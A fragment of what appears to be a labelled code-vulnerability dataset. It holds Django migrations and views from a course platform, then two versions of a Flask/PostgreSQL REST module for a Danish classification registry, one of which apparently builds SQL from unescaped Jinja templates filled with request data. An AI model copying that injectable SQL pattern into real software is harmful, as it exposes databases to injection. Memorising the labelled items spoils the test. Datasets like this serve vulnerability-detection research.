bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='Threshold',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('name', models.CharField(max_length=255)),\n                ('consume_harder_points', models.BooleanField(help_text='Harder points are consumed by easier difficulty requirements.', default=False)),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds')),\n                ('passed_categories', models.ManyToManyField(blank=True, to='course.LearningObjectCategory')),\n                ('passed_exercises', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),\n                ('passed_modules', models.ManyToManyField(blank=True, to='course.CourseModule')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='ThresholdPoints',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('limit', models.PositiveIntegerField()),\n                ('difficulty', models.CharField(blank=True, max_length=32)),\n                ('order', models.PositiveIntegerField(default=1)),\n                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points')),\n            ],\n            options={\n                'ordering': ['threshold', 'order'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='coursemodulerequirement',\n            name='threshold',\n            field=models.ForeignKey(to='threshold.Threshold'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/userprofile/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nfrom django.conf import settings\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='StudentGroup',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(unique=True, max_length=32)),\n                ('description', models.CharField(max_length=256)),\n                ('member_limit', models.PositiveIntegerField()),\n                ('is_public', models.BooleanField(default=False)),\n                ('invitation_key', models.CharField(max_length=10, blank=True)),\n            ],\n            options={\n                'ordering': ['name'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='UserProfile',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('lang', models.CharField(default=b'en_US', max_length=5)),\n                ('student_id', models.CharField(max_length=25, null=True, blank=True)),\n                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL)),\n            ],\n            options={\n                'ordering': ['id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='studentgroup',\n            name='members',\n            field=models.ManyToManyField(related_name='groups', to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/userprofile/viewbase.py/n/nfrom django.core.exceptions import PermissionDenied\nfrom django.template.response import SimpleTemplateResponse\n\nfrom lib.viewbase import BaseMixin, BaseTemplateView\nfrom authorization.permissions import ACCESS\nfrom .models import UserProfile\n\n\nclass UserProfileMixin(BaseMixin):\n    access_mode = ACCESS.STUDENT\n    login_redirect = True\n\n    def get_resource_objects(self):\n        super().get_resource_objects()\n        user = self.request.user\n        if user.is_authenticated():\n            self.profile = profile = user.userprofile\n            self.is_external_student = profile.is_external\n        else:\n            self.profile = None\n            self.is_external_student = False\n\n        # Add available for template\n        self.note(\"profile\", \"is_external_student\")\n\n\nclass UserProfileView(UserProfileMixin, BaseTemplateView):\n    pass\n/n/n/n/userprofile/views.py/n/nimport logging\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.contrib.auth.views import login as django_login\nfrom django.core.cache import cache\nfrom django.core.cache.utils import make_template_fragment_key\nfrom django.http.response import HttpResponseRedirect\nfrom django.shortcuts import resolve_url\nfrom django.template.loader import TemplateDoesNotExist, get_template\nfrom django.utils.http import is_safe_url\nfrom django.utils.translation import get_language\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom lib.helpers import settings_text\nfrom authorization.permissions import ACCESS\nfrom .viewbase import UserProfileView\n\n\nlogger = logging.getLogger('userprofile.views')\n\n\ndef login(request):\n    \"\"\"\n    Wraps the default login view in Django. Additionally redirects already\n    authenticated users automatically to the target.\n    \"\"\"\n    if request.user.is_authenticated():\n        redirect_to = request.POST.get(REDIRECT_FIELD_NAME,\n                                       request.GET.get(REDIRECT_FIELD_NAME, ''))\n        if not is_safe_url(url=redirect_to, host=request.get_host()):\n            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)\n        return HttpResponseRedirect(redirect_to)\n\n    return django_login(\n        request,\n        template_name=\"userprofile/login.html\",\n        extra_context={\n            'shibboleth_login': 'shibboleth_login' in settings.INSTALLED_APPS,\n            'mooc_login': 'social_django' in settings.INSTALLED_APPS,\n            'login_title_text': settings_text('LOGIN_TITLE_TEXT'),\n            'login_body_text': settings_text('LOGIN_BODY_TEXT'),\n            'login_button_text': settings_text('LOGIN_BUTTON_TEXT'),\n            'shibboleth_title_text': settings_text('SHIBBOLETH_TITLE_TEXT'),\n            'shibboleth_body_text': settings_text('SHIBBOLETH_BODY_TEXT'),\n            'shibboleth_button_text': settings_text('SHIBBOLETH_BUTTON_TEXT'),\n            'mooc_title_text': settings_text('MOOC_TITLE_TEXT'),\n            'mooc_body_text': settings_text('MOOC_BODY_TEXT'),\n        }\n    )\n\n\ndef try_get_template(name):\n    try:\n        return get_template(name)\n    except TemplateDoesNotExist:\n        logger.info(\"Template %s not found\", name)\n        return None\n\n\nclass PrivacyNoticeView(UserProfileView):\n    access_mode=ACCESS.ANONYMOUS\n    template_name=\"userprofile/privacy.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        lang = \"_\" + get_language().lower()\n        key = make_template_fragment_key('privacy_notice', [lang])\n        privacy_text = cache.get(key)\n        if not privacy_text:\n            template_name = \"privacy_notice{}.html\"\n            template = try_get_template(template_name.format(lang))\n            if not template and len(lang) > 3:\n                template = try_get_template(template_name.format(lang[:3]))\n            if not template:\n                logger.warning(\"No localized privacy notice for language %s\", lang)\n                template = try_get_template(template_name.format(''))\n            if not template:\n                logger.error(\"No privacy notice at all!\")\n\n            privacy_text = template.render() if template else _(\"No privacy notice. Please notify administration!\")\n            cache.set(key, privacy_text)\n        self.privacy_text = privacy_text\n        self.note(\"privacy_text\")\n\nclass ProfileView(UserProfileView):\n    template_name = \"userprofile/profile.html\"\n/n/n/n", "label": 1}, {"id": "b0b9410c36bce2e946d48695d9a0eca31b11c15a", "code": "klassifikation/rest/db.py/n/nfrom enum import Enum\n\nimport psycopg2\nfrom psycopg2.extras import DateTimeTZRange\nfrom psycopg2.extensions import adapt as psyco_adapt\n\nfrom jinja2 import Template\nfrom jinja2 import Environment, FileSystemLoader\n\nfrom settings import DATABASE, DB_USER\nfrom db_helpers import get_attribute_fields, get_attribute_names\nfrom db_helpers import get_state_names\n\n\"\"\"\n    Jinja2 Environment\n\"\"\"\n\njinja_env = Environment(loader=FileSystemLoader('./templates/sql'))\n\ndef adapt(value):\n    # return psyco_adapt(value)\n    # Damn you, character encoding!\n    return str(psyco_adapt(value.encode('utf-8'))).decode('utf-8')\n\njinja_env.filters['adapt'] = adapt\n\n\"\"\"\n    GENERAL FUNCTION AND CLASS DEFINITIONS\n\"\"\"\n\n\n\ndef get_connection():\n    \"\"\"Handle all intricacies of connecting to Postgres.\"\"\"\n    connection = psycopg2.connect(\"dbname={0} user={1}\".format(DATABASE,\n                                                               DB_USER))\n    connection.autocommit = True\n    return connection\n\n\ndef get_authenticated_user():\n    \"\"\"Return hardcoded UUID until we get real authentication in place.\"\"\"\n    return \"615957e8-4aa1-4319-a787-f1f7ad6b5e2c\"\n\n\ndef convert_attributes(attributes):\n    \"Convert attributes from dictionary to list in correct order.\"\n    for attr_name in attributes:\n        current_attr_periods = attributes[attr_name]\n        converted_attr_periods = []\n        for attr_period in current_attr_periods:\n            field_names = get_attribute_fields(attr_name)\n            attr_value_list = [\n                attr_period[f] if f in attr_period else None\n                for f in field_names\n                ]\n            converted_attr_periods.append(attr_value_list)\n        attributes[attr_name] = converted_attr_periods\n    return attributes\n\n\nclass Livscyklus(Enum):\n    OPSTAAET = 'Opstaaet'\n    IMPORTERET = 'Importeret'\n    PASSIVERET = 'Passiveret'\n    SLETTET = 'Slettet'\n    RETTET = 'Rettet'\n\n\n\"\"\"\n    GENERAL SQL GENERATION.\n\n    All of these functions generate bits of SQL to use in complete statements.\n    At some point, we might want to factor them to an \"sql_helpers.py\" module.\n\"\"\"\n\n\ndef sql_state_array(state, periods, class_name):\n    \"\"\"Return an SQL array of type <state>TilsType.\"\"\"\n    t = jinja_env.get_template('state_array.sql')\n    sql = t.render(class_name=class_name, state_name=state,\n                   state_periods=periods)\n    return sql\n\n\ndef sql_attribute_array(attribute, periods):\n    \"\"\"Return an SQL array of type <attribute>AttrType[].\"\"\"\n    t = jinja_env.get_template('attribute_array.sql')\n    sql = t.render(attribute_name=attribute, attribute_periods=periods)\n    return sql\n\n\ndef sql_relations_array(class_name, relations):\n    \"\"\"Return an SQL array of type <class_name>RelationType[].\"\"\"\n    t = jinja_env.get_template('relations_array.sql')\n    sql = t.render(class_name=class_name, relations=relations)\n    return sql\n\n\ndef sql_convert_registration(states, attributes, relations, class_name):\n    \"\"\"Convert input JSON to the SQL arrays we need.\"\"\"\n    sql_states = []\n    for s in get_state_names(class_name):\n        periods = states[s] if s in states else []\n        sql_states.append(\n            sql_state_array(s, periods, class_name)\n        )\n\n    sql_attributes = []\n    for a in get_attribute_names(class_name):\n        periods = attributes[a] if a in attributes else []\n        sql_attributes.append(\n            sql_attribute_array(a, periods)\n        )\n\n    sql_relations = sql_relations_array(class_name, relations)\n\n    return (sql_states, sql_attributes, sql_relations)\n\n\n\"\"\"\n    GENRAL OBJECT RELATED FUNCTIONS\n\"\"\"\n\n\ndef object_exists(class_name, uuid):\n    \"\"\"Check if an object with this class name and UUID exists already.\"\"\"\n    sql = \"select (%s IN (SELECT DISTINCT facet_id from facet_registrering))\"\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, (uuid,))\n    result = cursor.fetchone()[0]\n    \n    return result\n\n\ndef create_or_import_object(class_name, note, attributes, states, relations,\n                            uuid=None):\n    \"\"\"Create a new object by calling the corresponding stored procedure.\n\n    Create a new object by calling actual_state_create_or_import_{class_name}.\n    It is necessary to map the parameters to our custom PostgreSQL data types.\n    \"\"\"\n\n    # Data from the BaseRegistration.\n    # Do not supply date, that is generated by the DB.\n    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None\n                       else Livscyklus.IMPORTERET.value)\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n    sql_template = jinja_env.get_template('create_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef delete_object(class_name, note, uuid):\n    \"\"\"Delete object by using the stored procedure.\n    \n    Deleting is the same as updating with the life cycle code \"Slettet\".\n    \"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.SLETTET.value\n    sql_template = jinja_env.get_template('passivate_or_delete_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\ndef passivate_object(class_name, note, uuid):\n    \"\"\"Passivate object by calling the stored procedure.\"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.PASSIVERET.value\n    sql_template = jinja_env.get_template('passivate_or_delete_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef update_object(class_name, note, attributes, states, relations, uuid=None):\n    \"\"\"Update object with the partial data supplied.\"\"\"\n    life_cycle_code = Livscyklus.RETTET.value\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n\n    sql_template = jinja_env.get_template('update_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    try:\n        cursor.execute(sql)\n        output = cursor.fetchone()\n        print output\n    except psycopg2.DataError:\n        # Thrown when no changes\n        pass\n    return uuid\n\n\ndef list_objects(class_name, uuid, virkning_fra, virkning_til,\n                 registreret_fra, registreret_til):\n    \"\"\"List objects with the given uuids, optionally filtering by the given\n    virkning and registering periods.\"\"\"\n\n    assert isinstance(uuid, list)\n\n    sql_template = jinja_env.get_template('list_objects.sql')\n    sql = sql_template.render(\n        class_name=class_name\n    )\n\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, {\n        'uuid': uuid,\n        'registrering_tstzrange': DateTimeTZRange(registreret_fra,\n                                                  registreret_til),\n        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)\n    })\n    output = cursor.fetchone()\n    return output\n/n/n/nklassifikation/rest/oio_rest.py/n/n\nfrom flask import jsonify, request\nimport db\n\n\n# Just a helper during debug\ndef j(t): return jsonify(output=t)\n\n\nclass OIOStandardHierarchy(object):\n    \"\"\"Implement API for entire hierarchy.\"\"\"\n\n    _classes = []\n\n    @classmethod\n    def setup_api(cls, flask, base_url):\n        \"\"\"Set up API for the classes included in the hierarchy.\n\n        Note that version number etc. may have to be added to the URL.\"\"\"\n        for c in cls._classes:\n            c.create_api(cls._name, flask, base_url)\n\n\nclass OIORestObject(object):\n    \"\"\"\n    Implement an OIO object - manage access to database layer for this object.\n\n    This class is intended to be subclassed, but not to be initialized.\n    \"\"\"\n\n    @classmethod\n    def create_object(cls):\n        \"\"\"\n        CREATE object, generate new UUID.\n        \"\"\"\n        if not request.json:\n            return jsonify({'uuid': None}), 400\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n        uuid = db.create_or_import_object(cls.__name__, note, attributes,\n                                          states, relations)\n        return jsonify({'uuid': uuid}), 201\n\n    @classmethod\n    def get_objects(cls):\n        \"\"\"\n        LIST or SEARCH facets, depending on parameters.\n        \"\"\"\n        virkning_fra = request.args.get('virkningFra', None)\n        virkning_til = request.args.get('virkningTil', None)\n        registreret_fra = request.args.get('registreretFra', None)\n        registreret_til = request.args.get('registreretTil', None)\n\n        # TODO: Implement search\n\n        uuid = request.args.get('uuid', None)\n        if uuid is None:\n            # This is not allowed, but we let the DB layer throw an exception\n            uuid = []\n        else:\n            uuid = uuid.split(',')\n\n        results = db.list_objects(cls.__name__, uuid, virkning_fra,\n                                 virkning_til, registreret_fra,\n                                 registreret_til)\n        if results is None:\n            results = []\n        # TODO: Return JSON object key should be based on class name,\n        # e.g. {\"Facetter\": [..]}, not {\"results\": [..]}\n        # TODO: Include Return value\n        return jsonify({'results': results})\n\n    @classmethod\n    def get_object(cls, uuid):\n        \"\"\"\n        READ a facet, return as JSON.\n        \"\"\"\n        return j(\"Hent {0} fra databasen og returner som JSON\".format(uuid))\n\n    @classmethod\n    def put_object(cls, uuid):\n        \"\"\"\n        UPDATE, IMPORT or PASSIVIZE an  object.\n        \"\"\"\n        if not request.json:\n            return jsonify({'uuid': None}), 400\n        # Get most common parameters if available.\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n\n        if not db.object_exists(cls.__name__, uuid):\n            # Do import.\n            result = db.create_or_import_object(cls.__name__, note, attributes,\n                                                states, relations, uuid)\n            # TODO: When connected to DB, use result properly.\n            return j(u\"Importeret {0}: {1}\".format(cls.__name__, uuid)), 200\n        else:\n            \"Edit or passivate.\"\n            if (request.json.get('livscyklus', '').lower() == 'passiv'):\n                # Passivate\n                db.passivate_object(\n                        cls.__name__, note, uuid\n                )\n                return j(\n                            u\"Passiveret {0}: {1}\".format(cls.__name__, uuid)\n                        ), 200\n            else:\n                # Edit/change\n                result = db.update_object(cls.__name__, note, attributes,\n                                          states, relations, uuid)\n                return j(u\"Opdateret {0}: {1}\".format(cls.__name__, uuid)), 200\n        return j(u\"Forkerte parametre!\"), 405\n\n    @classmethod\n    def delete_object(cls, uuid):\n        # Delete facet\n        #import pdb; pdb.set_trace()\n        note = request.json.get(\"Note\", \"\")\n        class_name = cls.__name__\n        result = db.delete_object(class_name, note, uuid)\n\n        return j(\"Slettet {0}: {1}\".format(class_name, uuid)), 200\n\n    @classmethod\n    def create_api(cls, hierarchy, flask, base_url):\n        \"\"\"Set up API with correct database access functions.\"\"\"\n        hierarchy = hierarchy.lower()\n        class_name = cls.__name__.lower()\n        class_url = u\"{0}/{1}/{2}\".format(base_url,\n                                          hierarchy,\n                                          cls.__name__.lower())\n        uuid_regex = (\n            \"[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}\" +\n            \"-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\"\n        )\n        object_url = u'{0}/<regex(\"{1}\"):uuid>'.format(\n            class_url,\n            uuid_regex\n        )\n\n        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),\n                           cls.get_objects, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),\n                           cls.get_object, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),\n                           cls.put_object, methods=['PUT'])\n\n        flask.add_url_rule(\n            class_url, u'_'.join([cls.__name__, 'create_object']),\n            cls.create_object, methods=['POST']\n        )\n\n        flask.add_url_rule(\n            object_url, u'_'.join([cls.__name__, 'delete_object']),\n            cls.delete_object, methods=['DELETE']\n        )\n/n/n/n", "label": 0}, {"id": "b0b9410c36bce2e946d48695d9a0eca31b11c15a", "code": "/klassifikation/rest/db.py/n/nfrom enum import Enum\n\nimport psycopg2\nfrom psycopg2.extras import DateTimeTZRange\nfrom jinja2 import Template\n\nfrom settings import DATABASE, DB_USER\nfrom db_helpers import get_attribute_fields, get_attribute_names\nfrom db_helpers import get_state_names\n\n\"\"\"\n    GENERAL FUNCTION AND CLASS DEFINITIONS\n\"\"\"\n\n\ndef get_connection():\n    \"\"\"Handle all intricacies of connecting to Postgres.\"\"\"\n    connection = psycopg2.connect(\"dbname={0} user={1}\".format(DATABASE,\n                                                               DB_USER))\n    connection.autocommit = True\n    return connection\n\n\ndef get_authenticated_user():\n    \"\"\"Return hardcoded UUID until we get real authentication in place.\"\"\"\n    return \"615957e8-4aa1-4319-a787-f1f7ad6b5e2c\"\n\n\ndef convert_attributes(attributes):\n    \"Convert attributes from dictionary to list in correct order.\"\n    for attr_name in attributes:\n        current_attr_periods = attributes[attr_name]\n        converted_attr_periods = []\n        for attr_period in current_attr_periods:\n            field_names = get_attribute_fields(attr_name)\n            attr_value_list = [\n                attr_period[f] if f in attr_period else None\n                for f in field_names\n                ]\n            converted_attr_periods.append(attr_value_list)\n        attributes[attr_name] = converted_attr_periods\n    return attributes\n\n\nclass Livscyklus(Enum):\n    OPSTAAET = 'Opstaaet'\n    IMPORTERET = 'Importeret'\n    PASSIVERET = 'Passiveret'\n    SLETTET = 'Slettet'\n    RETTET = 'Rettet'\n\n\n\"\"\"\n    GENERAL SQL GENERATION.\n\n    All of these functions generate bits of SQL to use in complete statements.\n    At some point, we might want to factor them to an \"sql_helpers.py\" module.\n\"\"\"\n\n\ndef sql_state_array(state, periods, class_name):\n    \"\"\"Return an SQL array of type <state>TilsType.\"\"\"\n    with open('templates/sql/state_array.sql', 'r') as f:\n        raw_sql = f.read()\n    t = Template(raw_sql)\n    sql = t.render(class_name=class_name, state_name=state,\n                   state_periods=periods)\n    return sql\n\n\ndef sql_attribute_array(attribute, periods):\n    \"\"\"Return an SQL array of type <attribute>AttrType[].\"\"\"\n    with open('templates/sql/attribute_array.sql', 'r') as f:\n        raw_sql = f.read()\n    t = Template(raw_sql)\n    sql = t.render(attribute_name=attribute, attribute_periods=periods)\n    return sql\n\n\ndef sql_relations_array(class_name, relations):\n    \"\"\"Return an SQL array of type <class_name>RelationType[].\"\"\"\n    with open('templates/sql/relations_array.sql', 'r') as f:\n        raw_sql = f.read()\n    t = Template(raw_sql)\n    sql = t.render(class_name=class_name, relations=relations)\n    return sql\n\n\ndef sql_convert_registration(states, attributes, relations, class_name):\n    \"\"\"Convert input JSON to the SQL arrays we need.\"\"\"\n    sql_states = []\n    for s in get_state_names(class_name):\n        periods = states[s] if s in states else []\n        sql_states.append(\n            sql_state_array(s, periods, class_name)\n        )\n\n    sql_attributes = []\n    for a in get_attribute_names(class_name):\n        periods = attributes[a] if a in attributes else []\n        sql_attributes.append(\n            sql_attribute_array(a, periods)\n        )\n\n    sql_relations = sql_relations_array(class_name, relations)\n\n    return (sql_states, sql_attributes, sql_relations)\n\n\n\"\"\"\n    GENRAL OBJECT RELATED FUNCTIONS\n\"\"\"\n\n\ndef object_exists(class_name, uuid):\n    \"\"\"Check if an object with this class name and UUID exists already.\"\"\"\n    sql = \"select (%s IN (SELECT DISTINCT facet_id from facet_registrering))\"\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, (uuid,))\n    result = cursor.fetchone()[0]\n    \n    return result\n\n\ndef create_or_import_object(class_name, note, attributes, states, relations,\n                            uuid=None):\n    \"\"\"Create a new object by calling the corresponding stored procedure.\n\n    Create a new object by calling actual_state_create_or_import_{class_name}.\n    It is necessary to map the parameters to our custom PostgreSQL data types.\n    \"\"\"\n\n    # Data from the BaseRegistration.\n    # Do not supply date, that is generated by the DB.\n    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None\n                       else Livscyklus.IMPORTERET.value)\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n    with open('templates/sql/create_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef delete_object(class_name, note, uuid):\n    \"\"\"Delete object by using the stored procedure.\n    \n    Deleting is the same as updating with the life cycle code \"Slettet\".\n    \"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.SLETTET.value\n    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\ndef passivate_object(class_name, note, uuid):\n    \"\"\"Passivate object by calling the stored procedure.\"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.PASSIVERET.value\n    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef update_object(class_name, note, attributes, states, relations, uuid=None):\n    \"\"\"Update object with the partial data supplied.\"\"\"\n    life_cycle_code = Livscyklus.RETTET.value\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n\n    with open('templates/sql/update_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    try:\n        cursor.execute(sql)\n        output = cursor.fetchone()\n        print output\n    except psycopg2.DataError:\n        # Thrown when no changes\n        pass\n    return uuid\n\n\ndef list_objects(class_name, uuid, virkning_fra, virkning_til,\n                 registreret_fra, registreret_til):\n    \"\"\"List objects with the given uuids, optionally filtering by the given\n    virkning and registering periods.\"\"\"\n\n    assert isinstance(uuid, list)\n\n    with open('templates/sql/list_objects.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name\n    )\n\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, {\n        'uuid': uuid,\n        'registrering_tstzrange': DateTimeTZRange(registreret_fra,\n                                                  registreret_til),\n        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)\n    })\n    output = cursor.fetchone()\n    return output\n/n/n/n/klassifikation/rest/oio_rest.py/n/n\nfrom flask import jsonify, request\nimport db\n\n\n# Just a helper during debug\ndef j(t): return jsonify(output=t)\n\n\nclass OIOStandardHierarchy(object):\n    \"\"\"Implement API for entire hierarchy.\"\"\"\n\n    _classes = []\n\n    @classmethod\n    def setup_api(cls, flask, base_url):\n        \"\"\"Set up API for the classes included in the hierarchy.\n\n        Note that version number etc. may have to be added to the URL.\"\"\"\n        for c in cls._classes:\n            c.create_api(cls._name, flask, base_url)\n\n\nclass OIORestObject(object):\n    \"\"\"\n    Implement an OIO object - manage access to database layer for this object.\n\n    This class is intended to be subclassed, but not to be initialized.\n    \"\"\"\n\n    @classmethod\n    def create_object(cls):\n        \"\"\"\n        CREATE object, generate new UUID.\n        \"\"\"\n        if not request.json:\n            abort(400)\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n        uuid = db.create_or_import_object(cls.__name__, note, attributes,\n                                          states, relations)\n        return jsonify({'uuid': uuid}), 201\n\n    @classmethod\n    def get_objects(cls):\n        \"\"\"\n        LIST or SEARCH facets, depending on parameters.\n        \"\"\"\n        virkning_fra = request.args.get('virkningFra', None)\n        virkning_til = request.args.get('virkningTil', None)\n        registreret_fra = request.args.get('registreretFra', None)\n        registreret_til = request.args.get('registreretTil', None)\n\n        # TODO: Implement search\n\n        uuid = request.args.get('uuid', None)\n        if uuid is None:\n            # This is not allowed, but we let the DB layer throw an exception\n            uuid = []\n        else:\n            uuid = uuid.split(',')\n\n        results = db.list_objects(cls.__name__, uuid, virkning_fra,\n                                 virkning_til, registreret_fra,\n                                 registreret_til)\n        if results is None:\n            results = []\n        # TODO: Return JSON object key should be based on class name,\n        # e.g. {\"Facetter\": [..]}, not {\"results\": [..]}\n        # TODO: Include Return value\n        return jsonify({'results': results})\n\n    @classmethod\n    def get_object(cls, uuid):\n        \"\"\"\n        READ a facet, return as JSON.\n        \"\"\"\n        return j(\"Hent {0} fra databasen og returner som JSON\".format(uuid))\n\n    @classmethod\n    def put_object(cls, uuid):\n        \"\"\"\n        UPDATE, IMPORT or PASSIVIZE an  object.\n        \"\"\"\n        if not request.json:\n            abort(400)\n        # Get most common parameters if available.\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n\n        if not db.object_exists(cls.__name__, uuid):\n            # Do import.\n            result = db.create_or_import_object(cls.__name__, note, attributes,\n                                                states, relations, uuid)\n            # TODO: When connected to DB, use result properly.\n            return j(u\"Importeret {0}: {1}\".format(cls.__name__, uuid)), 200\n        else:\n            \"Edit or passivate.\"\n            if (request.json.get('livscyklus', '').lower() == 'passiv'):\n                # Passivate\n                db.passivate_object(\n                        cls.__name__, note, uuid\n                )\n                return j(\n                            u\"Passiveret {0}: {1}\".format(cls.__name__, uuid)\n                        ), 200\n            else:\n                # Edit/change\n                result = db.update_object(cls.__name__, note, attributes,\n                                          states, relations, uuid)\n                return j(u\"Opdateret {0}: {1}\".format(cls.__name__, uuid)), 200\n        return j(u\"Forkerte parametre!\"), 405\n\n    @classmethod\n    def delete_object(cls, uuid):\n        # Delete facet\n        #import pdb; pdb.set_trace()\n        note = request.json.get(\"Note\", \"\")\n        class_name = cls.__name__\n        result = 